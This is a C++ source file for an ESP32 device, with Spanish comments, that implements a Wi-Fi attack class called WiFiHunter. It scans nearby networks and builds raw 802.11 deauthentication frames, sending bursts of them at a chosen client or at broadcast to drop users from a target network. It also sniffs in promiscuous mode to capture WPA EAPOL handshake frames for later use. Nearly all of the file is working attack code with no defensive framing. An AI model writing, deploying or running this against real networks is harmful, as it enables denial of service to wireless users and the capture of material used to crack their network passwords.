#include "WiFiHunter.h"

WiFiHunter* WiFiHunter::instance = nullptr;
HandshakeCallback WiFiHunter::handshakeCB = nullptr;

void WiFiHunter::begin() {
    instance = this;
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    Serial.println("[WiFiHunter] Modo promiscuo activado");
}

// -------------------- ESCANEO DE REDES --------------------

void WiFiHunter::startScan() {
    esp_wifi_set_promiscuous(false);
    WiFi.scanNetworks(true, false);
    Serial.println("[WiFiHunter] Escaneando redes...");
}

bool WiFiHunter::isScanDone() {
    return (WiFi.scanComplete() >= 0);
}

void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontradas) {
    int n = WiFi.scanComplete();
    if (n <= 0) { encontradas = 0; return; }
    
    encontradas = (n < maxRedes) ? n : maxRedes;
    for (int i = 0; i < encontradas; i++) {
        strncpy(resultados[i].ssid, WiFi.SSID(i).c_str(), 32);
        resultados[i].ssid[32] = '\0';
        memcpy(resultados[i].bssid, WiFi.BSSID(i), 6);
        resultados[i].rssi = WiFi.RSSI(i);
        resultados[i].canal = WiFi.channel(i);
        resultados[i].tieneClave = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        resultados[i].handshakeCapturado = false;
    }
    WiFi.scanDelete();
    esp_wifi_set_promiscuous(true);
    Serial.printf("[WiFiHunter] %d redes encontradas\n", encontradas);
}

// -------------------- ESCANEO DE CLIENTES --------------------

void WiFiHunter::scanClients(const uint8_t* bssid, ClienteInfo* clientes, int maxClientes, int& encontrados) {
    encontrados = 0;
    // No implementamos un escaneo activo de clientes porque requiere más complejidad
    // En su lugar, usamos el modo promiscuo para escuchar tráfico y extraer MACs
    // Esto es un placeholder, lo dejamos para otra fase
    Serial.println("[WiFiHunter] Escaneo de clientes no implementado aún");
}

// -------------------- DEAUTH MEJORADO --------------------

void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPaquetes) {
    Serial.printf("[WiFiHunter] Atacando red: %s (canal %d)\n", red.ssid, red.canal);
    
    // Cambiar al canal de la red objetivo
    esp_wifi_set_channel(red.canal, WIFI_SECOND_CHAN_NONE);
    delay(50);
    
    // Si no se especifica cliente, usamos broadcast
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    const uint8_t* target = clienteMac ? clienteMac : broadcast;
    
    // Enviamos una ráfaga de paquetes
    for (int i = 0; i < numPaquetes; i++) {
        sendDeauthFrame(red.bssid, target, red.canal);
        delay(5); // Pequeña pausa entre paquetes
    }
    
    // También enviamos algunos a broadcast para asegurar
    if (clienteMac) {
        for (int i = 0; i < 5; i++) {
            sendDeauthFrame(red.bssid, broadcast, red.canal);
            delay(10);
        }
    }
    
    Serial.printf("[WiFiHunter] %d paquetes de deauth enviados\n", numPaquetes + (clienteMac ? 5 : 0));
}

void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac, int channel) {
    uint8_t deauthFrame[26];
    
    // Tipo: Deauthentication (0xC0)
    deauthFrame[0] = 0xC0;
    deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A;
    deauthFrame[3] = 0x01;
    
    // Dirección destino: cliente o broadcast
    memcpy(&deauthFrame[4], clienteMac, 6);
    
    // Dirección origen: nuestra MAC
    uint8_t nuestraMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
    memcpy(&deauthFrame[10], nuestraMac, 6);
    
    // BSSID: el router
    memcpy(&deauthFrame[16], bssid, 6);
    
    // Código de razón: 0x07 (Class 3 frame from nonassociated station)
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;
    
    // Enviar el frame
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
    if (err != ESP_OK) {
        Serial.printf("[WiFiHunter] Error enviando deauth: %d\n", err);
    }
}

// -------------------- DETECCIÓN DE HANDSHAKE (cola) --------------------

void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    if (len < 100) return;
    
    int offset = 24;
    bool encontrado = false;
    
    for (int i = offset; i < len - 8; i++) {
        if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
            frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
            if (frame[i+9] == 0x03) {
                if (instance) {
                    int next = (instance->head + 1) % MAX_PENDING_HS;
                    if (next != instance->tail) {
                        uint32_t copyLen = (len < 256) ? len : 256;
                        memcpy(instance->pending[instance->head].frame, frame, copyLen);
                        instance->pending[instance->head].len = copyLen;
                        instance->head = next;
                    }
                }
                encontrado = true;
                break;
            }
        }
    }
    
    if (!encontrado && len > 26) {
        offset = 26;
        for (int i = offset; i < len - 8; i++) {
            if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
                frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
                if (frame[i+9] == 0x03) {
                    if (instance) {
                        int next = (instance->head + 1) % MAX_PENDING_HS;
                        if (next != instance->tail) {
                            uint32_t copyLen = (len < 256) ? len : 256;
                            memcpy(instance->pending[instance->head].frame, frame, copyLen);
                            instance->pending[instance->head].len = copyLen;
                            instance->head = next;
                        }
                    }
                    break;
                }
            }
        }
    }
}

void WiFiHunter::processPendingHandshakes() {
    while (tail != head) {
        if (handshakeCB) {
            handshakeCB(pending[tail].frame, pending[tail].len);
        }
        tail = (tail + 1) % MAX_PENDING_HS;
    }
}

void WiFiHunter::setHandshakeCallback(HandshakeCallback cb) {
    handshakeCB = cb;
}
